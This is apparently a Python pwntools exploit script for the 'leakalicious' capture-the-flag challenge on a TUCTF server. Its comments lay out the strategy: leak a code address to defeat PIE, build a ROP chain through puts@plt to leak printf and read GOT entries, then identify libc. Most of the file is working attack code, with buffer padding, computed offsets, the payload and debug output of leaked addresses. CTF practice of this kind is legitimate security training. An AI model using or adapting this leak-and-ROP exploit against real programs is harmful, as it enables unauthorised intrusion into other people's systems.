#!/usr/bin/python3

from pwn import *

"""
Constraints:
    ASLR
    PIE
    NX

Strategy:
    1. leak .text section address because of PIE
    2. compute .text section addresses to ROP to puts_plt()
    3. leak libc address of printf_got_plt 
    4. leak libc address of read_got_plt

    5. use https://libc.blukat.me/ to find version of libc
    6. build final exploit with known libc version

    # 0x56559010 <printf@got.plt>:    0xf7e2f400
    # 0x5655900c <read@got.plt>:      0xf7ec8cf0
    # 0x56557080 "hmmmm... %s?\n" 
"""

context.log_level = 'debug'

def generate_payload(leaked_libc_csu):
    binary_base_addr = leaked_libc_csu - 0x12ab
    print("binary base = ", hex(binary_base_addr))

    puts_plt_addr = binary_base_addr + 0x1078
    print("puts plt = ", hex(puts_plt_addr))

    printf_got_plt_addr = binary_base_addr + 0x4010
    print("printf got plt = ", hex(printf_got_plt_addr))

    read_got_plt_addr = binary_base_addr + 0x400c
    print("read got plt = ", hex(read_got_plt_addr))

    payload = b""
    payload += b"A"*36
    payload += p32(binary_base_addr + 0x4000) # ebx
    payload += p32(binary_base_addr + 0x4000) # ebx
    payload += p32(puts_plt_addr) # eip 
    payload += p32(puts_plt_addr) # eip 
    payload += p32(printf_got_plt_addr) # printf_got_plt
    #payload += p32(binary_base_addr + 0x2080) # "hmmmm... %s?\n"
    payload += p32(read_got_plt_addr)
    return payload

def main():
    #target = process("./leakalicious")
    target = remote("chal.tuctf.com", 30505)
    
    prompt = target.recvuntil(b"> ")
    fmt_str = b"A"*3

    """
    read(stdin, user_input, 64);
    printf("hmmm... %s?", user_input);

       printf will stop at 0x00 bytes, so
       we fill the user_input buffer right before a couple
       of continous pointers in memory 
       AAA\n...0xf7fe42d0 0x00000000 

    0xffffd2a4:     0xffffd364      0xffffd36c      0x565562ab      0xf7fe42d0
    0xffffd2b4:     0x00000000
    """
    # Leak 0x565562ab <__libc_csu_init+27>:        0xfeecb38d
    target.sendline(fmt_str)
    leaked_libc_csu = u32(target.recvuntil(b"> ").split(b"\n")[1][8:12])
    print("__libc_csu_init+27 = ", hex(leaked_libc_csu))

    payload = generate_payload(leaked_libc_csu)
    target.sendline(payload)
    target.recvuntil(b"> ")

    target.sendline()
    """
    leaked:
        read@got.plt
        printf@got.plt
        __libc_start_main@got.plt

    [DEBUG] Received 0xe bytes:
    00000000  70 e6 de f7  40 d5 db f7  60 53 e0 f7  0a 0a        │p···│@···│`S··│··│
    0000000e
    p\xe6\xde\xf7@\xd5\xdb\xf7`S\xe0\xf7
    """
    target.interactive()

main()
